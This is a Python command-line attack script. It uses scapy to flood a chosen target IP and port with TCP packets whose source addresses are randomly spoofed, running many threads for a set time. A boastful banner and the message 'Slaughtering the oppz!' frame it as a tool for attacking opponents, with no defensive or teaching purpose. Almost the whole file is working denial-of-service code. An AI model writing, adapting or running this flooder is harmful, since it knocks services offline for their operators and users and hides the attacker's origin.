#!/usr/bin/env python3
import time, sys, threading, os, random, string
from scapy.all import *
from urllib.parse import urlparse

_abort = False
_ip = ''

def _dominate():
    while _abort == False:
        try:
            fake = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=fake) / TCP(sport=RandShort(), dport=int(sys.argv[2]), flags="SEC")
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    global _ip
    _host = sys.argv[1].lower()
    if not (_host.startswith("http://") or _host.startswith("htts://")):
        _host = "http://" + _host
        
    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
    except:
        sys.exit("\r\n DNS resolution failed! Exiting...\r\n")
        
def main():
    if len(sys.argv) != 5:
        sys.exit("\r\n Usage: <target> <port> <time> <threading>\r\n")
        
    if not os.geteuid() == 0:
        sys.exit("\r\n Script requires root elevation!\r\n")
    
    os.system('clear')
    global _abort, _ip
    _rslv()
    print("""\r\n\r\n\r\n\r\n\r\n\r\n
   ▄         ▄    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄      ▄     ▄▄▄▄▄▄▄▄▄▄▄ 
  ▐░▌       ▐░▌  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌    ▐░▌   ▐░░░░░░░░░░░▌
 ▄█░█▄▄▄▄▄▄▄█░█▄ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌    ▐░▌    ▀▀▀▀█░█▀▀▀▀ 
▐░░░░░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌          ▐░▌    ▐░▌        ▐░▌     
 ▀█░█▀▀▀▀▀▀▀█░█▀ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄█░█▄▄      ▐░▌     
  ▐░▌       ▐░▌  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
 ▄█░█▄▄▄▄▄▄▄█░█▄ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌     ▐░▌     
▐░░░░░░░░░░░░░░░▌▐░▌     ▐░▌  ▐░▌          ▐░▌       ▐░▌     ▐░▌     
 ▀█░█▀▀▀▀▀▀▀█░█▀ ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌     ▐░▌     
  ▐░▌       ▐░▌  ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌     ▐░▌     
   ▀         ▀    ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀       ▀      
""")
    print(" Slaughtering the oppz! " + _ip + ":" + sys.argv[2] + " is taking heavy damage for " + sys.argv[3] + " seconds...\r\n")

    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_dominate)
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == "__main__":
    main()
